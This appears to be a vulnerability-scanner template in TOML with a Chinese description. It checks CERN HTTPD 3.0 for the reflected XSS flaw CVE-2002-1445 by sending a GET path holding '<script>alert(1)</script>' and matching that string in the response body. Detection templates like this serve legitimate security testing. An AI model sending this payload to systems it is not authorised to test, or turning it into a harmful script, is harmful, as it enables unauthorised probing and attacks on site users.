[info]
author = "ave"
description = "验证 CERN HTTPD 3.0 XSS 漏洞：通过请求包含脚本的不存在页面，检查错误页面是否反射脚本内容"
id = "POC-AVE-2002-0590"
name = "CVE-2002-1445 CERN HTTPD XSS PoC"
severity = "medium"
tags = [
    "cve-2002-1445",
    "cern-httpd",
    "xss",
]
vuln_id = [
    "CVE-2002-1445",
    "AVE-2002-0590",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/<script>alert(1)</script>"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["<script>alert(1)</script>"]
